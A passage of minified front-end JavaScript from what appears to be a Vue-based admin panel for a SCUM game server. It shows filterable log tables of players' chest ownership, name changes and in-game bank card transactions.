0"}}),i("pre",{staticStyle:{width:"100%",height:"auto","padding-left":"10px"},domProps:{innerHTML:e._s(t.rawText.replace(/\n/g,"\\n<br>").replace(/\r/g,"\\r<br>"))}})]:e._e(),t.otherConfig&&t.otherConfig.owner&&t.otherConfig.owner.scumId?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("箱子主人信息")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("strong",{staticStyle:{color:"#1890ff"}},[e._v(e._s(t.otherConfig.owner.scumId))]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.otherConfig.owner.steamId||"无Steam ID")+")")])])]:e._e(),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("坐标信息详情")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),t.otherConfig&&t.otherConfig.chest&&t.otherConfig.chest.id?[i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("箱子ID:")]),i("strong",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(t.otherConfig.chest.id))])]),t.otherConfig&&t.otherConfig.chest&&t.otherConfig.chest.locations&&t.otherConfig.chest.area?i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("箱子坐标(区域):")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(t.otherConfig.chest.locations)),i("strong",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.otherConfig.chest.area)+")")])])]):e._e()]:e._e(),t.otherConfig&&t.otherConfig.chest&&t.otherConfig.chest.locations&&t.otherConfig.chest.area?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("箱子地图标识")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{height:"150px",width:"180px","padding-left":"10px"}},[i("map-locations",{attrs:{width:180,height:150,locations:t.otherConfig.chest.locations}})],1)]:e._e()]:e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.actionsListPagination.pageSize,current:e.actionsListPagination.pageNum,total:e.actionsListPagination.total},on:{change:e.onChangeActionsListPagination,showSizeChange:e.onShowSizeChangeActionsListPagination}})],1)}),[],!1,null,"6c95cc5a",null),wi=Si.exports,Li={name:"ChangeName",data:function(){return{moment:R.a,loadingActionsListTable:!1,actionsListFilter:{steamId:void 0,scumId:void 0,createdArea:void 0,targetName:void 0,timestampStart:void 0,timestampEnd:void 0},actionsListColumns:[{title:"操作人Steam ID",key:"steamId",dataIndex:"steamId",width:150,align:"center",scopedSlots:{customRender:"steamId"}},{title:"操作人游戏名称",key:"scumId",dataIndex:"scumId",width:180,align:"center",scopedSlots:{customRender:"scumId"}},{title:"新名字",key:"newScumId",dataIndex:"newScumId",width:180,align:"center",scopedSlots:{customRender:"newScumId"}},{title:"生成记录时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],actionsListData:[],actionsListPagination:{pageSize:20,pageNum:1,total:0},selectedRowKeys:[]}},mounted:function(){this.getActionsList()},methods:{onActionsListCleanFilter:function(){var e=this;this.actionsListPagination.pageNum=1,this.$nextTick((function(){e.getActionsList(!0)}))},onActionsListFilter:function(){var e=this;this.actionsListPagination.pageNum=1,this.$nextTick((function(){e.getActionsList()}))},onChangeActionsListPagination:function(e){var t=this;this.actionsListPagination.pageNum=e,this.$nextTick((function(){t.getActionsList()}))},onShowSizeChangeActionsListPagination:function(e,t){var i=this;this.actionsListPagination.pageNum=1,this.actionsListPagination.pageSize=t,this.$nextTick((function(){i.getActionsList()}))},getActionsList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.actionsListPagination,n=a.pageNum,r=a.pageSize,e?(t.actionsListFilter={steamId:void 0,scumId:void 0,timestampStart:void 0,timestampEnd:void 0},o={pageNum:n,pageSize:r,type:"changeName"}):(void 0!==(l=Object(A.cloneDeep)(t.actionsListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r,type:"changeName"},l)),t.loadingActionsListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/economyAdminSys/list",params:o});case 6:c=i.sent,t.loadingActionsListTable=!1,200===c.status&&(t.actionsListPagination.total=c.data.count,t.actionsListData=c.data.list),t.selectedRowKeys=[],i.next=16;break;case 12:i.prev=12,i.t0=i.catch(3),console.error(i.t0),t.loadingActionsListTable=!1;case 16:case"end":return i.stop()}}),i,null,[[3,12]])})))()},doCopyCommands:function(e){var t=this;this.$copyText(e).then((function(e){t.$message.success("已复制到剪贴板")}),(function(e){t.$message.error("复制失败"),console.log("复制失败：",e)}))},doCopyCommandsMulti:function(){var e=this,t=this.actionsListData.filter((function(t){return e.selectedRowKeys.includes(t.id)})).map((function(e){return e.rawText})).filter((function(e){var t;return(null==e||null===(t=e.trim())||void 0===t?void 0:t.length)>0})).join("\n");this.$copyText(t).then((function(t){e.$message.success("已复制到剪贴板")}),(function(t){e.$message.error("复制失败"),console.log("复制失败：",t)}))}}},ki=Li,Ii=Object(S.a)(ki,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onActionsListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onActionsListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")]),e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommandsMulti()}}},[e._v("全部复制到剪贴板")]):e._e()],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("操作者Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.actionsListFilter.steamId,callback:function(t){e.$set(e.actionsListFilter,"steamId",t)},expression:"actionsListFilter.steamId"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("操作者游戏名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.actionsListFilter.scumId,callback:function(t){e.$set(e.actionsListFilter,"scumId",t)},expression:"actionsListFilter.scumId"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("记录时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.actionsListFilter.timestampStart,e.actionsListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.actionsListFilter,"timestampStart",t[0]),e.$set(e.actionsListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.actionsListColumns,"data-source":e.actionsListData,"row-key":"id",pagination:!1,loading:e.loadingActionsListTable,bordered:"",scroll:{x:"100%"},size:"small","row-selection":{selectedRowKeys:e.selectedRowKeys,onChange:function(t){e.selectedRowKeys=t}}},on:{expand:function(t,i){if(t)void 0===e.expandedActionsIds.find((function(e){return e===i.id}))&&e.expandedActionsIds.push(i.id);else{var a=Object.keys(e.expandedActionsIds).find((function(t){return e.expandedActionsIds[t]===i.id}));void 0!==a&&e.expandedActionsIds.splice(a,1)}}},scopedSlots:e._u([{key:"steamId",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"scumId",fn:function(t,a){return[i("span",[e._v(e._s(t))]),a.actionsRecordUser&&a.actionsRecordUser.userName?i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.actionsRecordUser.userName}})}}},[e._v("("+e._s(a.actionsRecordUser.userName)+")")]):e._e()]}},{key:"newScumId",fn:function(t){return[i("span",[e._v(e._s(t.otherConfig.newScumId))])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.expandedActionsIds.find((function(e){return e===t.id}))?["string"==typeof t.rawText?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 135px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("日志原文")]),i("div",{staticStyle:{width:"125px",height:"24px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[i("a-button",{attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommands(t.rawText)}}},[e._v("复制到剪贴板")])],1)]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("pre",{staticStyle:{width:"100%",height:"auto","padding-left":"10px"},domProps:{innerHTML:e._s(t.rawText.replace(/\n/g,"\\n<br>").replace(/\r/g,"\\r<br>"))}})]:e._e()]:e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.actionsListPagination.pageSize,current:e.actionsListPagination.pageNum,total:e.actionsListPagination.total},on:{change:e.onChangeActionsListPagination,showSizeChange:e.onShowSizeChangeActionsListPagination}})],1)}),[],!1,null,"4871ae62",null),_i=Ii.exports,Ti={name:"BankAtm",components:{MapLocations:J},data:function(){return{moment:R.a,loadingActionsListTable:!1,actionsListFilter:{steamId:void 0,scumId:void 0,createdArea:void 0,targetName:void 0,timestampStart:void 0,timestampEnd:void 0},actionsListColumns:[{title:"操作人Steam ID",key:"steamId",dataIndex:"steamId",width:150,align:"center",scopedSlots:{customRender:"steamId"}},{title:"操作人游戏名称",key:"scumId",dataIndex:"scumId",width:180,align:"center",scopedSlots:{customRender:"scumId"}},{title:"操作类型",key:"type",dataIndex:"type",width:80,align:"center",scopedSlots:{customRender:"type"}},{title:"交易坐标(区域)",key:"locationsArea",dataIndex:"locationsArea",width:180,align:"center",scopedSlots:{customRender:"locationsArea"}},{title:"生成记录时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],actionsListData:[],actionsListPagination:{pageSize:20,pageNum:1,total:0},expandedActionsIds:[],gameArealList:[],actionTypeList:[{value:"bankPurchase",label:"开卡",color:"blue"},{value:"bankDeposite",label:"存钱",color:"green"},{value:"bankWithdraw",label:"取钱",color:"red"},{value:"bankTransfer",label:"转账",color:"red"},{value:"bankCancel",label:"注销",color:"black"},{value:"bankDestroy",label:"毁卡",color:"grey"}],cardTypeList:[{value:"Starter",label:"新手卡",color:"green"},{value:"Classic",label:"经典卡",color:"blue"},{value:"Gold",label:"金卡",color:"gold"}],selectedRowKeys:[]}},mounted:function(){this.getGameAreaList(),this.getActionsList()},methods:{onActionsListCleanFilter:function(){var e=this;this.actionsListPagination.pageNum=1,this.$nextTick((function(){e.getActionsList(!0)}))},onActionsListFilter:function(){var e=this;this.actionsListPagination.pageNum=1,this.$nextTick((function(){e.getActionsList()}))},onChangeActionsListPagination:function(e){var t=this;this.actionsListPagination.pageNum=e,this.$nextTick((function(){t.getActionsList()}))},onShowSizeChangeActionsListPagination:function(e,t){var i=this;this.actionsListPagination.pageNum=1,this.actionsListPagination.pageSize=t,this.$nextTick((function(){i.getActionsList()}))},getActionsList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.actionsListPagination,n=a.pageNum,r=a.pageSize,e?(t.actionsListFilter={steamId:void 0,scumId:void 0,createdArea:void 0,targetName:void 0,timestampStart:void 0,timestampEnd:void 0},o={pageNum:n,pageSize:r,type:"bank"}):(void 0!==(l=Object(A.cloneDeep)(t.actionsListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r,type:"bank"},l)),t.loadingActionsListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/economyAdminSys/list",params:o});case 6:c=i.sent,t.loadingActionsListTable=!1,200===c.status&&(t.actionsListPagination.total=c.data.count,t.actionsListData=c.data.list),t.selectedRowKeys=[],i.next=16;break;case 12:i.prev=12,i.t0=i.catch(3),console.error(i.t0),t.loadingActionsListTable=!1;case 16:case"end":return i.stop()}}),i,null,[[3,12]])})))()},doCopyCommands:function(e){var t=this;this.$copyText(e).then((function(e){t.$message.success("已复制到剪贴板")}),(function(e){t.$message.error("复制失败"),console.log("复制失败：",e)}))},doCopyCommandsMulti:function(){var e=this,t=this.actionsListData.filter((function(t){return e.selectedRowKeys.includes(t.id)})).map((function(e){return e.rawText})).filter((function(e){var t;return(null==e||null===(t=e.trim())||void 0===t?void 0:t.length)>0})).join("\n");this.$copyText(t).then((function(t){e.$message.success("已复制到剪贴板")}),(function(t){e.$message.error("复制失败"),console.log("复制失败：",t)}))},getGameAreaList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/serverConfigAdminSys/gameAreaList"});case 3:200===(i=t.sent).status&&(e.gameArealList=i.data),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()}}},Ci=Ti,Fi=Object(S.a)(Ci,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onActionsListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onActionsListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")]),e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommandsMulti()}}},[e._v("全部复制到剪贴板")]):e._e()],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("操作者Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.actionsListFilter.steamId,callback:function(t){e.$set(e.actionsListFilter,"steamId",t)},expression:"actionsListFilter.steamId"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("操作者游戏名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.actionsListFilter.scumId,callback:function(t){e.$set(e.actionsListFilter,"scumId",t)},expression:"actionsListFilter.scumId"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("操作者所在区域:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.actionsListFilter.createdArea,callback:function(t){e.$set(e.actionsListFilter,"createdArea",t)},expression:"actionsListFilter.createdArea"}},e._l(e.gameArealList,(function(t){return i("a-select-option",{key:t,attrs:{title:t}},[e._v(e._s(t))])})),1),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("记录时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.actionsListFilter.timestampStart,e.actionsListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.actionsListFilter,"timestampStart",t[0]),e.$set(e.actionsListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.actionsListColumns,"data-source":e.actionsListData,expandedRowKeys:e.expandedActionsIds,"row-key":"id",pagination:!1,loading:e.loadingActionsListTable,bordered:"",scroll:{x:"100%"},size:"small","row-selection":{selectedRowKeys:e.selectedRowKeys,onChange:function(t){e.selectedRowKeys=t}}},on:{expand:function(t,i){if(t)void 0===e.expandedActionsIds.find((function(e){return e===i.id}))&&e.expandedActionsIds.push(i.id);else{var a=Object.keys(e.expandedActionsIds).find((function(t){return e.expandedActionsIds[t]===i.id}));void 0!==a&&e.expandedActionsIds.splice(a,1)}}},scopedSlots:e._u([{key:"steamId",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"scumId",fn:function(t,a){return[i("span",[e._v(e._s(t))]),a.actionsRecordUser&&a.actionsRecordUser.userName?i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.actionsRecordUser.userName}})}}},[e._v("("+e._s(a.actionsRecordUser.userName)+")")]):e._e()]}},{key:"type",fn:function(t,a){return[i("a-tag",{attrs:{color:void 0!==e.actionTypeList.find((function(e){return e.value===a.type}))?e.actionTypeList.find((function(e){return e.value===a.type})).color:"grey"}},[e._v(" "+e._s(void 0!==e.actionTypeList.find((function(e){return e.value===a.type}))?e.actionTypeList.find((function(e){return e.value===a.type})).label:a.type)+" ")])]}},{key:"locationsArea",fn:function(t,a){return[i("span",[e._v(e._s(a.otherConfig.locations)+"("+e._s(a.otherConfig.area)+")")])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.expandedActionsIds.find((function(e){return e===t.id}))?["string"==typeof t.rawText?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 135px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("日志原文")]),i("div",{staticStyle:{width:"125px",height:"24px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[i("a-button",{attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommands(t.rawText)}}},[e._v("复制到剪贴板")])],1)]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("pre",{staticStyle:{width:"100%",height:"auto","padding-left":"10px"},domProps:{innerHTML:e._s(t.rawText.replace(/\n/g,"\\n<br>").replace(/\r/g,"\\r<br>"))}})]:e._e(),"bankPurchase"===t.type&&t.otherConfig&&t.otherConfig.purchaseInfo&&t.otherConfig.purchaseInfo.cardType?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("卡片信息")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("卡种:")]),i("strong",{staticStyle:{"margin-left":"10px"},style:{color:void 0!==e.cardTypeList.find((function(e){return e.value===t.otherConfig.purchaseInfo.cardType}))?e.cardTypeList.find((function(e){return e.value===t.otherConfig.purchaseInfo.cardType})).color:"grey"}},[e._v(e._s(void 0!==e.cardTypeList.find((function(e){return e.value===t.otherConfig.purchaseInfo.cardType}))?e.cardTypeList.find((function(e){return e.value===t.otherConfig.purchaseInfo.cardType})).label:"--"))])]),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("卡号:")]),i("strong",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(t.otherConfig.purchaseInfo.accountId))])]),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("余额:")]),i("strong",{staticStyle:{"margin-left":"10px",color:"#1890ff"}},[e._v("$"+e._s(t.otherConfig.purchaseInfo.newCredit))])])]:e._e(),"bankDeposite"===t.type&&t.otherConfig&&t.otherConfig.depositeInfo&&t.otherConfig.depositeInfo.from&&t.otherConfig.depositeInfo.from.accountId?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("交易信息")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("存款人信息:")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v(" (卡号: "),i("strong",[e._v(e._s(t.otherConfig.depositeInfo.from.accountId))]),e._v(")")])]),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("被存款卡信息:")]),i("span",{staticStyle:{"margin-left":"10px"}},[i("strong",[e._v(e._s(t.otherConfig.depositeInfo.to.scumId))]),e._v(" (Steam ID: "+e._s(t.otherConfig.depositeInfo.to.steamId)+", 卡号: "),i("strong",[e._v(e._s(t.otherConfig.depositeInfo.to.accountId))]),e._v(")")])]),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("交易明细:")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v("存入: "),i("strong",{staticStyle:{color:"#1890ff"}},[e._v("$"+e._s(t.otherConfig.depositeInfo.deal.total))]),e._v(", 除手续费入账金额: "),i("strong",{staticStyle:{color:"#1890ff"}},[e._v("$"+e._s(t.otherConfig.depositeInfo.deal.reality))])])])]:e._e(),"bankWithdraw"===t.type&&t.otherConfig&&t.otherConfig.withdrawInfo&&t.otherConfig.withdrawInfo.from&&t.otherConfig.withdrawInfo.to.accountId?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("交易信息")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("取款人信息:")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v(" (卡号: "),i("strong",[e._v(e._s(t.otherConfig.withdrawInfo.to.accountId))]),e._v(")")])]),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("被取款卡信息:")]),i("span",{staticStyle:{"margin-left":"10px"}},[i("strong",[e._v(e._s(t.otherConfig.withdrawInfo.from.scumId))]),e._v(" (Steam ID: "+e._s(t.otherConfig.withdrawInfo.from.steamId)+", 卡号: "),i("strong",[e._v(e._s(t.otherConfig.withdrawInfo.from.accountId))]),e._v(")")])]),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("交易明细:")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v("扣除: "),i("strong",{staticStyle:{color:"#1890ff"}},[e._v("$"+e._s(t.otherConfig.withdrawInfo.deal.reality))]),e._v(", 除手续费到手金额: "),i("strong",{staticStyle:{color:"#1890ff"}},[e._v("$"+e._s(t.otherConfig.withdrawInfo.deal.total))])])])]:e._e(),"bankDestroy"===t.type&&t.otherConfig&&t.otherConfig.destroyInfo&&t.otherConfig.destroyInfo.cardType?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("卡片信息")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("卡种:")]),i("strong",{staticStyle:{"margin-left":"10px"},style:{color:void 0!==e.cardTypeList.find((function(e){return e.value===t.otherConfig.destroyInfo.cardType}))?e.cardTypeList.find((function(e){return e.value===t.otherConfig.destroyInfo.cardType})).color:"grey"}},[e._v(e._s(void 0!==e.cardTypeList.find((function(e){return e.value===t.otherConfig.destroyInfo.cardType}))?e.cardTypeList.find((function(e){return e.value===t.otherConfig.destroyInfo.cardType})).label:"--"))])]),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("卡号:")]),i("strong",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(t.otherConfig.destroyInfo.target.accountId))])])]:e._e(),"bankTransfer"===t.type&&t.otherConfig&&t.otherConfig.transferInfo&&t.otherConfig.transferInfo.from&&t.otherConfig.transferInfo.to.accountId?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("交易信息")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("转账卡信息:")]),i("span",{staticStyle:{"margin-left":"10px"}},[i("strong",[e._v(e._s(t.otherConfig.transferInfo.from.scumId))]),e._v(" (Steam ID: "+e._s(t.otherConfig.transferInfo.from.steamId)+", 卡号: "),i("strong",[e._v(e._s(t.otherConfig.transferInfo.from.accountId))]),e._v(")")])]),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("收款卡信息:")]),i("span",{staticStyle:{"margin-left":"10px"}},[i("strong",[e._v(e._s(t.otherConfig.transferInfo.to.scumId))]),e._v(" (Steam ID: "+e._s(t.otherConfig.transferInfo.to.steamId)+", 卡号: "),i("strong",[e._v(e._s(t.otherConfig.transferInfo.to.accountId))]),e._v(")")])]),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("交易明细:")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v("扣除: "),i("strong",{staticStyle:{color:"#1890ff"}},[e._v("$"+e._s(t.otherConfig.transferInfo.deal.total))]),e._v(", 除手续费到账金额: 